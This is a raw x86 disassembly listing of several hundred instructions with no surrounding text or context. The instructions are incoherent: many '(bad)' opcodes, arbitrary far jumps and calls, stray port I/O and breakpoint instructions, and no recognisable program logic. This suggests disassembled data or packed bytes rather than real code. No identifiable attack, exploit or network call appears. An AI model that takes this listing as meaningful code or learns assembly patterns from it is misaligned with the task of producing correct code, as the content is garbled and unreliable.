  411aaa:	aad    0x62
  411aac:	cmp    ah,BYTE PTR [ebx-0x357c988b]
  411ab2:	and    ebp,DWORD PTR [edi-0x467a2]
  411ab8:	and    eax,0x82284ff
  411abd:	sbb    DWORD PTR [esi],ecx
  411abf:	mov    DWORD PTR [esi],ebp
  411ac1:	fnstsw WORD PTR [edx]
  411ac3:	push   es
  411ac4:	sbb    al,ah
  411ac6:	sbb    BYTE PTR [ecx],bh
  411ac8:	add    al,BYTE PTR [ebx-0x5e]
  411acb:	jne    0x411a94
  411acd:	ficomp WORD PTR [ebx+edx*2]
  411ad0:	sub    eax,0x2cfb08f6
  411ad5:	mov    eax,ds:0x8f792943
  411ada:	push   cs
  411adb:	sub    eax,0x2d406443
  411ae0:	cwde   
  411ae1:	adc    DWORD PTR [ebx-0x46ffc892],ebp
  411ae7:	inc    eax
  411ae8:	mov    ebx,0x5acee7d7
  411aed:	jp     0x411b3b
  411aef:	fiadd  WORD PTR [esi+0x36]
  411af2:	mov    dh,0x75
  411af4:	xchg   ecx,eax
  411af5:	push   esp
  411af6:	jmp    0xd6d6:0x48511fd
  411afd:	cld    
  411afe:	mov    WORD PTR [ebx-0x366b676c],gs
  411b04:	pop    esi
  411b05:	jg     0x411af2
  411b07:	mov    edx,0xaa99b203
  411b0c:	jp     0x411ae9
  411b0e:	(bad)  
  411b0f:	push   ds
  411b10:	jp     0x411b09
  411b12:	addr16 (bad) 
  411b14:	push   0xf
  411b16:	out    0x15,eax
  411b18:	out    dx,eax
  411b19:	scas   al,BYTE PTR es:[edi]
  411b1a:	loop   0x411ad8
  411b1c:	shl    DWORD PTR [edx+0x33],0xf3
  411b20:	xor    eax,0x6864fcc7
  411b25:	dec    ebx
  411b26:	inc    ebx
  411b27:	fwait
  411b28:	cmp    DWORD PTR [edx],esi
  411b2a:	inc    eax
  411b2b:	mov    cl,0x63
  411b2d:	imul   ebx,DWORD PTR [ebx],0xffffffb7
  411b30:	ins    BYTE PTR es:[edi],dx
  411b31:	call   0x3253:0xb76c55c5
  411b38:	mov    cs,edi
  411b3a:	dec    esi
  411b3b:	icebp  
  411b3c:	ret    
  411b3d:	sub    ebx,DWORD PTR [ecx]
  411b3f:	push   cs
  411b40:	inc    ebp
  411b41:	lds    edx,FWORD PTR [ebx+0x6cf7e117]
  411b47:	sbb    eax,0xd8a9229e
  411b4c:	(bad)  
  411b4d:	pop    esi
  411b4e:	rcl    DWORD PTR [ebx+0x77],0x3b
  411b52:	and    eax,0xfd5cc8b5
  411b57:	ficom  WORD PTR [esi]
  411b59:	shr    DWORD PTR [ebx+0x50],1
  411b5c:	int3   
  411b5d:	pushf  
  411b5e:	xor    dh,BYTE PTR [ecx-0x7a]
  411b61:	cwde   
  411b62:	fbld   TBYTE PTR [edx-0x516a8c3b]
  411b68:	xchg   DWORD PTR [edx],ebp
  411b6a:	cli    
  411b6b:	adc    BYTE PTR [eax-0x70],bh
  411b6e:	and    al,0xe3
  411b70:	adc    al,BYTE PTR [eax+0x73]
  411b73:	or     esp,esi
  411b75:	or     DWORD PTR [ebx],edi
  411b77:	sbb    bl,BYTE PTR [ebx+esi*8-0x16]
  411b7b:	add    DWORD PTR [ebx+ecx*1],edx
  411b7e:	push   ds
  411b7f:	adc    ebp,DWORD PTR cs:[edi]
  411b82:	shr    BYTE PTR [ecx+0x30d3c760],0x5f
  411b89:	aaa    
  411b8a:	mov    esp,0x8eaf47d3
  411b8f:	repz fs adc cl,dh
  411b93:	push   edx
  411b94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b95:	fs pop esi
  411b97:	int    0xc1
  411b99:	sbb    al,0x8a
  411b9b:	in     al,0x7f
  411b9d:	pop    ds
  411b9e:	stos   BYTE PTR es:[edi],al
  411b9f:	fimul  WORD PTR ss:[ecx+esi*8]
  411ba3:	aaa    
  411ba4:	cld    
  411ba5:	inc    ebx
  411ba6:	ins    BYTE PTR es:[edi],dx
  411ba7:	adc    dh,BYTE PTR [ebp-0x1c]
  411baa:	cdq    
  411bab:	icebp  
  411bac:	loope  0x411bc7
  411bae:	jle    0x411c2e
  411bb0:	es bswap eax
  411bb3:	ins    DWORD PTR es:[edi],dx
  411bb4:	addr16 in ax,dx
  411bb7:	mov    esp,0x5728822f
  411bbc:	test   al,0x89
  411bbe:	rcr    DWORD PTR [eax],cl
  411bc0:	push   0xb1b5fd4d
  411bc5:	and    edi,ebx
  411bc7:	pop    eax
  411bc8:	stc    
  411bc9:	push   cx
  411bcb:	arpl   WORD PTR [ebx+0x37],dx
  411bce:	aad    0xcd
  411bd0:	inc    eax
  411bd1:	inc    ebx
  411bd2:	push   0x39
  411bd4:	fsubrp st(4),st
  411bd6:	sahf   
  411bd7:	loop   0x411b8a
  411bd9:	pop    esp
  411bda:	add    BYTE PTR [esi-0x7f],dl
  411bdd:	idiv   BYTE PTR [edx-0x31]
  411be0:	cmp    eax,0xf9056010
  411be5:	add    DWORD PTR [ecx+0x344f02ea],edi
  411beb:	sub    ebx,DWORD PTR [ecx]
  411bed:	jns    0x411bbf
  411bef:	push   edi
  411bf0:	push   ds
  411bf1:	in     eax,0xb
  411bf3:	pushf  
  411bf4:	fild   QWORD PTR [ecx]
  411bf6:	sub    al,0x4e
  411bf8:	sahf   
  411bf9:	stos   BYTE PTR es:[edi],al
  411bfa:	mov    esp,?
  411bfc:	addr16 cdq 
  411bfe:	xchg   edi,eax
  411bff:	mov    ecx,0x38eb1613
  411c04:	int3   
  411c05:	and    dl,BYTE PTR [eax-0x7d]
  411c08:	cwde   
  411c09:	mov    esp,0x51e0e0ce
  411c0e:	dec    eax
  411c0f:	mov    ds:0x5b62c47f,eax
  411c14:	xor    cl,BYTE PTR [eax-0x5c]
  411c17:	out    0xc,eax
  411c19:	mov    esp,DWORD PTR [ebx]
  411c1b:	or     edx,DWORD PTR [esi+0x74]
  411c1e:	ret    
  411c1f:	icebp  
  411c20:	push   0xfc74453b
  411c25:	ret    
  411c26:	mov    es,WORD PTR [edx]
  411c28:	xor    DWORD PTR [edx-0x17],0x25
  411c2c:	pop    ebx
  411c2d:	int3   
  411c2e:	sbb    eax,0xfbbee345
  411c33:	stos   BYTE PTR es:[edi],al
  411c34:	loopne 0x411c84
  411c36:	adc    al,0xc4
  411c38:	icebp  
  411c39:	push   es
  411c3a:	lock cmp eax,0xfa9a325
  411c40:	xor    al,0x70
  411c42:	adc    BYTE PTR [eax+ecx*8],al
  411c45:	jno    0x411bc7
  411c47:	xchg   DWORD PTR [edx+0xed05327],edx
  411c4d:	push   ss
  411c4e:	mov    al,0x3
  411c50:	push   eax
  411c51:	xchg   edx,eax
  411c52:	xchg   BYTE PTR [eax-0x64272286],bl
  411c58:	pop    ss
  411c59:	push   ecx
  411c5a:	sbb    al,0x9a
  411c5c:	into   
  411c5d:	jmp    0x27ac:0xfd8006fb
  411c64:	jno    0x411c75
  411c66:	je     0x411cab
  411c68:	inc    ebp
  411c69:	pop    edi
  411c6a:	adc    DWORD PTR [ebp-0x33],esp
  411c6d:	pop    ds
  411c6e:	div    DWORD PTR [ebp+0x15]
  411c71:	cmc    
  411c72:	stos   BYTE PTR es:[edi],al
  411c73:	test   DWORD PTR [ecx+eiz*8-0x6e80f8e6],edx
  411c7a:	(bad)  
  411c7b:	xor    BYTE PTR [edx],ah
  411c7d:	push   ebp
  411c7e:	pop    edx
  411c7f:	test   al,0x6f
  411c81:	in     al,0x32
  411c83:	shl    DWORD PTR [edx+0x37],cl
  411c86:	popa   
  411c87:	mov    fs,WORD PTR [edi+0x780af4de]
  411c8d:	ss and bl,cl
  411c90:	xchg   ebp,eax
  411c91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c92:	test   al,0x6d
  411c94:	adc    BYTE PTR [edx],0xc6
  411c97:	shr    BYTE PTR [eax],cl
  411c99:	jecxz  0x411caa
  411c9b:	loop   0x411cd7
  411c9d:	xor    ecx,DWORD PTR [ecx]
  411c9f:	rol    BYTE PTR [edx+0x26],1
  411ca2:	(bad)  
  411ca3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ca4:	lods   eax,DWORD PTR ds:[esi]
  411ca5:	and    DWORD PTR [edi+0x1b195685],esi
  411cab:	lahf   
  411cac:	mov    eax,0xf42d4ddf
  411cb1:	push   ss
  411cb2:	iret   
  411cb3:	push   edi
  411cb4:	pop    esi
  411cb5:	lea    edx,[eax]
  411cb7:	jecxz  0x411d21
  411cb9:	aam    0x59
  411cbb:	fild   DWORD PTR [esi+esi*4]
  411cbe:	mov    al,ds:0xacb07d8c
  411cc3:	leave  
  411cc4:	aaa    
  411cc5:	inc    ebx
  411cc6:	ja     0x411cad
  411cc8:	and    ch,BYTE PTR [eax]
  411cca:	sar    DWORD PTR [edi+0x38cd0538],cl
  411cd0:	sbb    DWORD PTR gs:[edx-0x71b74103],edx
  411cd7:	cdq    
  411cd8:	outs   dx,DWORD PTR ds:[esi]
  411cd9:	adc    edi,DWORD PTR [esi]
  411cdb:	mov    ds:0x7890e7e8,al
  411ce0:	das    
  411ce1:	cwde   
  411ce2:	push   ecx
  411ce3:	int3   
  411ce4:	dec    esp
  411ce5:	jle    0x411cd5
  411ce7:	in     eax,dx
  411ce8:	sbb    DWORD PTR [ebp+0x34b1a165],edi
  411cee:	scas   eax,DWORD PTR es:[edi]
  411cef:	das    
  411cf0:	jle    0x411ce8
  411cf2:	dec    eax
  411cf3:	or     BYTE PTR [edx+0x5e9f7906],dl
  411cf9:	jo     0x411d22
  411cfb:	imul   edx,DWORD PTR [edx+0xfbe21bf],0xffffffb7
  411d02:	inc    edi
  411d03:	test   eax,0xd2b9dc3c
  411d08:	jns    0x411ccd
  411d0a:	fstp   TBYTE PTR [eax+0x1ac5b8ae]
  411d10:	dec    esp
  411d11:	inc    esi
  411d12:	cmc    
  411d13:	sub    cl,BYTE PTR [eax]
  411d15:	stc    
  411d16:	call   0x181ae7d5
  411d1b:	test   DWORD PTR [edx+eax*1+0x136ecabe],0xf9b4164f
  411d26:	dec    ecx
  411d27:	dec    eax
  411d29:	dec    esi
  411d2a:	mov    eax,0x421eed6f
  411d2f:	imul   eax,DWORD PTR [esi+0x68],0xdc849719
  411d36:	(bad)  
  411d37:	lock mov cl,0x91
  411d3a:	es into 
  411d3c:	cs push edi
  411d3e:	out    dx,eax
  411d3f:	not    edi
  411d41:	je     0x411d32
  411d43:	je     0x411d1d
  411d45:	pop    edx
  411d46:	addr16 data16 in al,0x27
  411d4a:	xor    eax,0x5d1cb870
  411d4f:	xchg   ch,cl
  411d51:	loopne 0x411cd9
  411d53:	out    0x42,al
  411d55:	iret   
  411d56:	jnp    0x411d69
  411d58:	mov    esp,0x2a29f905
  411d5d:	xchg   DWORD PTR [ebx+ecx*1],esi
  411d60:	jp     0x411d15
  411d62:	js     0x411d08
  411d64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d65:	(bad)  
  411d66:	xchg   esi,eax
  411d67:	loop   0x411db1
  411d69:	xchg   DWORD PTR [edx+0x18],edi
  411d6c:	retf   0xc1f1
  411d6f:	mov    dl,0x77
  411d71:	inc    eax
  411d72:	push   esi
  411d73:	fwait
  411d74:	aaa    
  411d75:	push   ss
  411d76:	push   cs
  411d77:	outs   dx,BYTE PTR ds:[esi]
  411d78:	shl    DWORD PTR [esi-0x76],1
  411d7b:	scas   eax,DWORD PTR es:[edi]
  411d7c:	xchg   ecx,eax
  411d7d:	lea    edx,[edi+eax*1-0x10f64cf8]
  411d84:	add    eax,0xa76574c5
  411d89:	mul    DWORD PTR [ebp+0x6d1464de]
  411d8f:	out    dx,al
  411d90:	lahf   
  411d91:	(bad)
  411d94:	mov    WORD PTR [edi-0x4e5652a3],cs
  411d9a:	adc    edi,DWORD PTR [eax]
  411d9c:	dec    esi
  411d9d:	xor    eax,0x990fdfca
  411da2:	push   es
  411da3:	dec    ebx
  411da4:	arpl   WORD PTR [edx+0x4ad4aef4],cx
  411daa:	pop    esi
  411dab:	dec    edx
  411dac:	fild   DWORD PTR [edx-0x2f]
  411daf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411db0:	dec    ebp
  411db1:	out    dx,al
  411db2:	and    ecx,DWORD PTR [ecx+edx*4-0x55b2c966]
  411db9:	enter  0xe60b,0x11
  411dbd:	sub    ch,ch
  411dbf:	retf   
  411dc0:	out    dx,al
  411dc1:	mov    BYTE PTR [edi+0xfa30bf3],dh
  411dc7:	cmp    bl,BYTE PTR [edx-0x3e]
  411dca:	inc    eax
  411dcb:	push   0xfffffffd
  411dcd:	int    0x6b
  411dcf:	stos   DWORD PTR es:[edi],eax
  411dd0:	sub    DWORD PTR [ebx],0xffffffb6
  411dd3:	adc    DWORD PTR [ebx-0x3a],esi
  411dd6:	xchg   esi,eax
  411dd7:	mov    dh,BYTE PTR [ecx+0x18]
  411dda:	out    0x39,eax
  411ddc:	jmp    0xd98c73e8
  411de1:	fisttp QWORD PTR [esi-0x2cdb066a]
  411de7:	mov    al,ds:0x4ee518cf
  411dec:	iret   
  411ded:	mov    ah,0x8d
  411def:	cmc    
  411df0:	in     eax,0x2c
  411df2:	mov    ebx,0x5ae270b8
  411df7:	scas   al,BYTE PTR es:[edi]
  411df8:	push   ds
  411df9:	adc    eax,0x7b2d05bd
  411dfe:	sbb    eax,0xe75f67c5
  411e03:	push   eax
  411e04:	lods   eax,DWORD PTR ds:[esi]
  411e05:	cmp    al,0xe2
  411e07:	push   ds
  411e08:	lock inc edx
  411e0a:	mul    BYTE PTR [eax]
  411e0c:	sbb    ecx,DWORD PTR [esi]
  411e0e:	add    esi,DWORD PTR ds:0x146c18c4
  411e14:	xor    dh,dl
  411e16:	pop    esp
  411e17:	mov    ch,0x43
  411e19:	scas   eax,DWORD PTR es:[edi]
  411e1a:	inc    edx
  411e1b:	jle    0x411e4f
  411e1d:	imul   ecx,DWORD PTR ds:0x3f08ac6d,0x42c6c2f9
  411e27:	arpl   WORD PTR [ebx],sp
  411e29:	fist   DWORD PTR [esi+0x5fe2bdc]
  411e2f:	adc    ah,BYTE PTR [ecx+0x2a]
  411e32:	mov    ebp,0x6ef3a398
  411e37:	or     DWORD PTR [esi+0x1b],ecx
  411e3a:	loopne 0x411ebb
  411e3c:	hlt    
  411e3d:	jl     0x411ea2
  411e3f:	jecxz  0x411e35
  411e41:	xor    eax,0x3b2cf2a
  411e46:	push   DWORD PTR [edi-0x5c]
  411e49:	push   ss
  411e4a:	jle    0x411ec2
  411e4c:	push   ebp
  411e4d:	cdq    
  411e4e:	pop    esp
  411e4f:	test   al,0x4
  411e51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e52:	push   DWORD PTR [ecx-0x3d]
  411e55:	out    dx,eax
  411e56:	jne    0x411ec7
  411e58:	jae    0x411eb5
  411e5a:	cmp    eax,DWORD PTR [ebx-0x4d4bc145]
  411e60:	(bad)
  411e63:	jbe    0x411eba
  411e65:	(bad)  
  411e66:	xor    edx,DWORD PTR [esi+0x4dda3070]
  411e6c:	add    eax,0x1e3fa8e9
  411e71:	into   
  411e72:	xchg   edx,eax
  411e73:	sub    ecx,DWORD PTR [esi+ebp*2+0x38]
  411e77:	sub    DWORD PTR [edi-0x352fc452],ecx
  411e7d:	xor    dh,al
  411e7f:	mov    bl,0xbe
  411e81:	pop    ss
  411e82:	sbb    BYTE PTR [esi],0x68
  411e85:	cld    
  411e86:	mov    ?,WORD PTR [eax+eax*2]
  411e89:	mov    dh,0x46
  411e8b:	cmc    
  411e8c:	xchg   esp,eax
  411e8d:	sub    BYTE PTR [edi+0x3d],bh
  411e90:	test   al,0x46
  411e92:	sub    DWORD PTR [edx+0x6ac82011],ebp
  411e98:	idiv   DWORD PTR [eax]
  411e9a:	fmul   st(7),st
  411e9c:	jg     0x411e4b
  411e9e:	xchg   esp,eax
  411e9f:	inc    edi
  411ea0:	test   BYTE PTR [eax],al
  411ea2:	sub    edx,edx
  411ea4:	loopne 0x411ef9
  411ea6:	mov    al,ds:0x275d207a
  411eab:	sub    eax,0x82672b0c
  411eb0:	mov    dl,BYTE PTR [esi+0x9]
  411eb3:	pop    ebp
  411eb4:	rcr    BYTE PTR [eax-0x36],0x1c
  411eb8:	mov    eax,0xf1e4af4b
  411ebd:	push   edi
  411ebe:	es inc ebp
  411ec0:	adc    bl,ch
  411ec2:	adc    ebp,DWORD PTR [ecx-0x1312ba14]
  411ec8:	lods   eax,DWORD PTR ds:[esi]
  411ec9:	push   ecx
  411eca:	mov    ebx,ebp
  411ecc:	aad    0x1e
  411ece:	or     eax,0x3ee6225d
  411ed3:	fisttp DWORD PTR [ebx+ebp*2-0x13]
  411ed7:	xchg   edx,eax
  411ed8:	in     eax,dx
  411ed9:	loop   0x411eb5
  411edb:	dec    eax
  411edc:	adc    al,0x97
  411ede:	repnz mov ah,0x87
  411ee1:	jbe    0x411ece
  411ee3:	ja     0x411e9f
  411ee5:	dec    ecx
  411ee6:	mov    ss,ecx
  411ee8:	add    BYTE PTR [ecx],0xab
  411eeb:	repnz mov ebx,0x82303c5e
  411ef1:	mov    esp,0xb9c25778
  411ef6:	rcr    bh,cl
  411ef8:	mov    ebx,0xc1dfd970
  411efd:	aaa    
  411efe:	pusha  
  411eff:	xchg   DWORD PTR [esi-0x2d],ebp
  411f02:	add    BYTE PTR [eax-0x3516ce96],0x8f
  411f09:	push   ebx
  411f0a:	lock xchg esp,eax
  411f0c:	jmp    0x411f2c
  411f0e:	cmc    
  411f0f:	ss push edi
  411f11:	xchg   ebx,eax
  411f12:	sbb    ch,BYTE PTR [edx+0x24265b76]
  411f18:	mov    bh,0xc7
  411f1a:	mov    eax,0x7b40afc7
  411f1f:	mov    ds:0x5cd1ff7a,al
  411f24:	and    edi,edx
  411f26:	pop    ds
  411f27:	or     eax,0x892c6c36
  411f2c:	out    dx,al
  411f2d:	jge    0x411ee0
  411f2f:	in     eax,dx
  411f30:	nop
  411f31:	ss push edx
  411f33:	mov    DWORD PTR [ebx],ebx
  411f35:	ret    0xe119
  411f38:	stos   DWORD PTR es:[edi],eax
  411f39:	test   eax,0x3c7ecfa8
  411f3e:	mov    al,ds:0x9ed0cd18
  411f43:	retf   
  411f44:	xchg   ebx,eax
  411f46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f47:	push   es
  411f48:	sar    DWORD PTR [esi+ebp*8],cl
  411f4b:	push   ebx
  411f4c:	or     ecx,DWORD PTR [edi+0x22]
  411f4f:	adc    al,0x76
  411f51:	and    cl,al
  411f53:	fadd   QWORD PTR [edx]
  411f55:	mov    ?,ebp
  411f57:	inc    ebp
  411f58:	push   esp
  411f59:	daa    
  411f5a:	pushf  
  411f5b:	scas   al,BYTE PTR es:[edi]
  411f5c:	cwde   
  411f5d:	into   
  411f5e:	adc    bh,dh
  411f60:	std    
  411f61:	mov    dh,0xb9
  411f63:	in     eax,dx
  411f64:	shl    DWORD PTR [esi-0x39],cl
  411f67:	adc    BYTE PTR [edx],0x44
  411f6a:	mov    ds:0x488a4368,al
  411f6f:	push   0xaaf01d74
  411f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f75:	mov    esp,es
  411f77:	pop    ds
  411f78:	dec    esi
  411f79:	xor    DWORD PTR [esi-0x1cfd0149],esp
  411f7f:	jne    0x411fcc
  411f81:	retf   0x4408
  411f84:	xor    al,0xf9
  411f86:	out    dx,eax
  411f87:	adc    esp,DWORD PTR [ebx+ebx*1+0x5493720c]
  411f8e:	int3   
  411f8f:	inc    esp
  411f90:	sbb    esi,DWORD PTR [eax]
  411f92:	mov    esi,es
  411f94:	adc    cl,bh
  411f96:	xchg   ebp,eax
  411f97:	inc    ecx
  411f98:	xor    eax,0x6809e317
  411f9d:	or     dl,BYTE PTR [eax+0x51]
  411fa0:	mov    edi,0x7df3d37e
  411fa5:	xchg   esp,eax
  411fa6:	fidivr DWORD PTR [ecx-0x45305129]
  411fac:	fwait
  411fad:	or     eax,0xf081e7a9
  411fb2:	shl    ecx,0xe1
  411fb5:	xchg   ebx,eax
  411fb6:	imul   ebp,esi,0xffffffa8
  411fb9:	mov    WORD PTR [ecx-0x75c5d079],cs
  411fbf:	mov    ebp,0x5233560c
  411fc4:	push   eax
  411fc5:	cmc    
  411fc6:	ja     0x41203c
  411fc8:	xchg   ebx,eax
  411fc9:	dec    edx
  411fca:	add    eax,0xd034adae
  411fcf:	and    BYTE PTR fs:[ebp-0x62],bh
  411fd3:	sahf   
  411fd4:	push   0xffffffbc
  411fd6:	xchg   esi,eax
  411fd7:	inc    esp
  411fd8:	push   ecx
  411fd9:	xchg   esi,eax
  411fda:	inc    eax
  411fdb:	cmp    dh,0x7
  411fde:	pop    edi
  411fdf:	adc    BYTE PTR [eax+0x7],ch
  411fe2:	sbb    esi,DWORD PTR [ebp-0x65]
  411fe5:	and    al,0xb0
  411fe7:	push   ecx
  411fe8:	mov    al,ds:0xf1d7bb13
  411fed:	sbb    BYTE PTR [edx-0x6668a1],0xe7
  411ff4:	ss (bad) 
  411ff6:	fiadd  WORD PTR [edi-0xa]
  411ff9:	pop    esp
  411ffa:	shl    ecx,0x8b
  411ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ffe:	fbstp  TBYTE PTR [ebp-0x56]
  412001:	sbb    ecx,DWORD PTR [esi+0x7775efeb]
  412007:	fsub   QWORD PTR ds:0xb59cdb6b
  41200d:	repnz inc edi
  41200f:	xor    eax,0xd3c6c0e3
  412014:	inc    esp
  412015:	fist   WORD PTR [edi+ebp*4]
  412018:	push   esi
  412019:	pop    edx
  41201a:	adc    esi,0x3193ac97
  412020:	push   esi
  412021:	(bad)  
  412022:	mov    DWORD PTR [edx-0x6713c87b],0xc542cdb5
  41202c:	mov    DWORD PTR [ebx-0x3184de50],edi
  412032:	xlat   BYTE PTR ds:[ebx]
  412033:	enter  0xa130,0x44
  412037:	imul   esi,DWORD PTR ds:0x45c1529b,0x8fb57641
  412041:	sub    cl,BYTE PTR [eax+0xf]
  412044:	mov    ecx,0x9c8dddbb
  412049:	js     0x41209d
  41204b:	hlt    
  41204c:	fimul  DWORD PTR [eax-0x5b]
  41204f:	cdq    
  412050:	dec    edi
  412051:	adc    ch,dl
  412053:	or     BYTE PTR [ebp+0x69],0x24
  412057:	sbb    esi,eax
  412059:	push   ebx
  41205a:	push   ss
  41205b:	xchg   edi,eax
  41205c:	or     eax,0x54682938
  412061:	jae    0x41206b
  412063:	loope  0x412039
  412065:	push   edx
  412066:	sub    bl,0xd1
  412069:	sbb    DWORD PTR ds:0x6e4f1b70,edx
  41206f:	clc    
  412070:	add    BYTE PTR [edx+edx*4-0x9933b84],cl
  412077:	sub    dh,BYTE PTR [edi+ecx*8]
  41207a:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41207c:	(bad)  
  41207d:	ins    DWORD PTR es:[edi],dx
  41207e:	std    
  41207f:	aad    0x5d
  412081:	sub    BYTE PTR [esi],ch
  412083:	cmp    bl,dl
  412085:	daa    
  412086:	lods   al,BYTE PTR ds:[esi]
  412087:	loopne 0x41200f
  412089:	jo     0x4120a0
  41208b:	cld    
  41208c:	add    BYTE PTR ds:0x59937c66,dl
  412092:	sbb    dl,BYTE PTR [edx+0x15c4a9ad]
  412098:	mov    eax,ds:0xdfd9ade8
  41209d:	retf   
  41209e:	jp     0x4120e3
  4120a0:	popf   
  4120a1:	aaa    
  4120a2:	add    BYTE PTR [ebp+0x1bf41c1c],bh
  4120a8:	ds sub ebx,esp
  4120ab:	lods   al,BYTE PTR ds:[esi]
  4120ac:	aad    0x15
  4120ae:	bnd jb 0x412109
  4120b1:	sbb    al,0xb7
  4120b3:	lea    edi,[esi]
  4120b5:	pop    edi
  4120b6:	popa   
  4120b7:	adc    eax,0xe84815cb
  4120bc:	loope  0x4120c6
  4120be:	pop    esi
  4120bf:	int3   
  4120c0:	sbb    al,0xac
  4120c2:	aad    0x71
  4120c4:	mov    ecx,0x311d819a
  4120c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120ca:	pop    esi
  4120cb:	xor    dh,ah
  4120cd:	xchg   BYTE PTR [ebx+esi*2-0x61d3a89a],bl
  4120d4:	add    DWORD PTR [ecx-0x74],eax
  4120d7:	sbb    dl,BYTE PTR [ebx]
  4120d9:	pop    ebp
  4120da:	mov    cl,0x2a
  4120dc:	jne    0x4120a3
  4120de:	xlat   BYTE PTR ds:[ebx]
  4120df:	pop    ebp
  4120e0:	repz in al,dx
  4120e2:	cdq    
  4120e3:	std    
  4120e4:	div    BYTE PTR [ecx+0x63]
  4120e7:	sbb    cl,cl
  4120e9:	xchg   edi,eax
  4120ea:	add    al,0x94
  4120ed:	sar    BYTE PTR [edx-0x28],cl
  4120f0:	aad    0x4
  4120f2:	inc    eax
  4120f3:	add    al,0x17
  4120f5:	or     al,0xc1
  4120f7:	popa   
  4120f8:	jmp    0xa2b48d84
  4120fd:	inc    ecx
  4120fe:	inc    ecx
  4120ff:	jg     0x41211c
  412101:	les    edi,FWORD PTR [ebx-0x4e61c54f]
  412107:	mov    dl,0x54
  412109:	xchg   ecx,eax
  41210a:	stos   BYTE PTR es:[edi],al
  41210b:	jge    0x4120ca
  41210d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41210e:	bound  ebp,QWORD PTR [ebx]
  412110:	cli    
  412111:	in     eax,dx
  412112:	and    bh,bl
  412114:	mov    ah,0xf4
  412116:	jo     0x41210b
  412118:	das    
  412119:	adc    eax,0x5c4974d3
  41211e:	jge    0x412190
  412120:	and    DWORD PTR [eax],ecx
  412122:	in     al,dx
  412123:	jmp    0x96e6:0x1504ae25
  41212a:	aaa    
  41212b:	lock pop ss
  41212d:	inc    ebx
  41212e:	push   edi
  41212f:	jbe    0x4121a9
  412131:	and    esp,DWORD PTR [edi]
  412133:	in     eax,0x89
  412135:	jae    0x412172
  412137:	stos   BYTE PTR es:[edi],al
  412138:	sub    ebp,DWORD PTR [edi+0x20]
  41213b:	sub    DWORD PTR [ebx-0x75],0x6f69cd30
  412142:	test   DWORD PTR [ecx+ecx*1],ebp
  412145:	push   esi
  412146:	and    edi,ecx
  412148:	mov    bl,0x79
  41214a:	sbb    dl,BYTE PTR [ecx+0x3562912b]
  412150:	loope  0x412105
  412152:	mov    eax,ds:0x61d7fbd6
  412157:	out    0x3b,al
  412159:	lods   al,BYTE PTR ds:[esi]
  41215a:	pop    es
  41215b:	shl    esi,cl
  41215d:	sub    ecx,esi
  41215f:	stos   DWORD PTR es:[edi],eax
  412160:	aad    0xca
  412162:	outs   dx,DWORD PTR ds:[esi]
  412163:	mov    al,ds:0x911779f6
  412168:	outs   dx,BYTE PTR ds:[esi]
  412169:	ret    
  41216a:	mov    WORD PTR [edi+0xcb23f5c],ds
  412170:	mov    al,ds:0x6fddc705
  412175:	test   al,0x72
  412177:	in     eax,0xfe
  412179:	rcl    DWORD PTR [ecx+0xe],0xf7
  41217d:	iret   
  41217e:	std    
  41217f:	jge    0x41216a
  412181:	jmp    0x1e36:0xefc7d6c8
  412188:	xor    DWORD PTR [edx],ebp
  41218a:	cmp    ah,BYTE PTR [edx-0x3c]
  41218d:	(bad)  [esi-0x13]
  412190:	rcr    edi,cl
  412192:	push   edx
  412193:	mov    DWORD PTR [edi-0x41],edi
  412196:	loop   0x4121bf
  412198:	leave  
  412199:	addr16 inc edx
  41219b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41219c:	mov    edx,0xbfdae81b
  4121a1:	call   0x688b:0x93bccbfb
  4121a8:	sub    bh,BYTE PTR ds:0x11753726
  4121ae:	jo     0x4121f8
  4121b0:	dec    edx
  4121b1:	dec    edx
  4121b2:	push   0x2f5f9494
  4121b7:	into   
  4121b8:	lods   al,BYTE PTR ds:[esi]
  4121b9:	push   eax
  4121ba:	xor    esi,DWORD PTR [edi+0x1a]
  4121bd:	lods   al,BYTE PTR ds:[esi]
  4121be:	loop   0x4121f6
  4121c0:	rcl    DWORD PTR [ebp-0x30],0xe7
  4121c4:	ins    BYTE PTR es:[edi],dx
  4121c5:	loope  0x4121ac
  4121c7:	fsubr  DWORD PTR [ecx]
  4121c9:	jge    0x4121fe
  4121cb:	xor    ah,BYTE PTR [esi+0x2b1fc692]
  4121d1:	mov    edx,0xa9babbfe
  4121d6:	sub    eax,0x15aeb82c
  4121db:	ret    0x6734
  4121de:	pop    edi
  4121df:	rcl    BYTE PTR [eax+0x65b76922],cl
  4121e5:	add    al,0x3
  4121e7:	mov    ds:0x98749630,al
  4121ec:	mov    BYTE PTR [ecx-0x6f0f9432],ah
  4121f2:	xchg   edi,eax
  4121f3:	and    BYTE PTR [eax],bh
  4121f5:	fcomp  st(1)
  4121f7:	fwait
  4121f8:	mov    fs,WORD PTR [ebx-0x7584e7d1]
  4121fe:	call   0x597f7113
  412203:	mov    al,0xf3
  412205:	dec    edi
  412206:	add    BYTE PTR [edi+0x6ba01136],dh
  41220c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41220d:	adc    esi,DWORD PTR [ebx+0x174bb2f2]
  412213:	xchg   esi,eax
  412214:	in     al,0x49
  412216:	push   edi
  412217:	imul   edi,DWORD PTR ds:0xcb74543c,0xbe88cded
  412221:	sbb    eax,0xc7500332
  412226:	ret    0x129a
  412229:	pop    edi
  41222a:	fwait
  41222b:	jle    0x41226c
  41222d:	cmc    
  41222e:	std    
  41222f:	test   BYTE PTR ds:0x36840c6a,al
  412235:	push   esp
  412236:	arpl   WORD PTR [ecx],ax
  412238:	idiv   DWORD PTR [eax+0x77]
  41223b:	shl    esp,cl
  41223d:	test   al,0xdf
  41223f:	jmp    0x41220d
  412241:	sbb    ch,cl
  412243:	pop    edx
